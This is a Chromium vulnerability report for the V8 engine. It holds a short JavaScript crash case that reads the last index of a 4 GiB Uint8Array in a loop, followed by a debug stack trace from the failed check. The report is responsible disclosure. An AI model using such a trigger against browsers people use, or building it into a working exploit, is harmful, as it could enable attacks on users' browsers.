<b>VULNERABILITY DETAILS</b>
<b>Please provide a brief explanation of the security issue.</b>

See attachment

<b>VERSION</b>
Operating System: Ubuntu 18.04 LTS
Chromium: 85.0.4183.15
v8: 8.5.210.8 (3505cf00eb4c59b87f4b5ec9fc702f7935fdffd0)

<b>REPRODUCTION CASE</b>

```JavaScript
const kSize = 4294967296;
function vuln() {
        const v22 = new Uint8Array(kSize);
        return v22["4294967295"];
}

while (true) {
        vuln();
}
```

<b>FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION</b>
Type of crash: v8 crash
Crash State: 

#
# Fatal error in ../../src/objects/lookup.cc, line 924
# Debug check failed: !IsElement(*holder_).
#
#
#
#FailureMessage Object: 0x7ffedf7b25b0
==== C stack trace ===============================

    /home/pc/v/v8/d8/v8/out.gn/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x21) [0x7f5b8a83bc51]
    /home/pc/v/v8/d8/v8/out.gn/x64.debug/libv8_libplatform.so(+0x5681a) [0x7f5b8a7c381a]
    /home/pc/v/v8/d8/v8/out.gn/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x26f) [0x7f5b8a8249df]
    /home/pc/v/v8/d8/v8/out.gn/x64.debug/libv8_libbase.so(+0x3a32c) [0x7f5b8a82432c]
    /home/pc/v/v8/d8/v8/out.gn/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x27) [0x7f5b8a824a97]
    /home/pc/v/v8/d8/v8/out.gn/x64.debug/libv8.so(v8::internal::LookupIterator::GetFieldIndex() const+0x19a) [0x7f5b88f1ac5a]
    /home/pc/v/v8/d8/v8/out.gn/x64.debug/libv8.so(v8::internal::LoadIC::ComputeHandler(v8::internal::LookupIterator*)+0x248e) [0x7f5b88be9a9e]
    /home/pc/v/v8/d8/v8/out.gn/x64.debug/libv8.so(v8::internal::LoadIC::UpdateCaches(v8::internal::LookupIterator*)+0x555) [0x7f5b88be62d5]
    /home/pc/v/v8/d8/v8/out.gn/x64.debug/libv8.so(v8::internal::LoadIC::Load(v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Name>, bool)+0x8e9) [0x7f5b88be5639]
    /home/pc/v/v8/d8/v8/out.gn/x64.debug/libv8.so(+0x258254d) [0x7f5b88bf454d]
    /home/pc/v/v8/d8/v8/out.gn/x64.debug/libv8.so(v8::internal::Runtime_LoadIC_Miss(int, unsigned long*, v8::internal::Isolate*)+0x128) [0x7f5b88bf4048]
    /home/pc/v/v8/d8/v8/out.gn/x64.debug/libv8.so(+0x1abab9f) [0x7f5b8812cb9f]
Received signal 4 ILL_ILLOPN 7f5b8a838ca1
Illegal instruction

<b>CREDIT INFORMATION</b>
<b>Externally reported security bugs may appear in Chrome release notes. If</b>
<b>this bug is included, how would you like to be credited?</b>
Reporter credit: 2019 of Pangu Lab
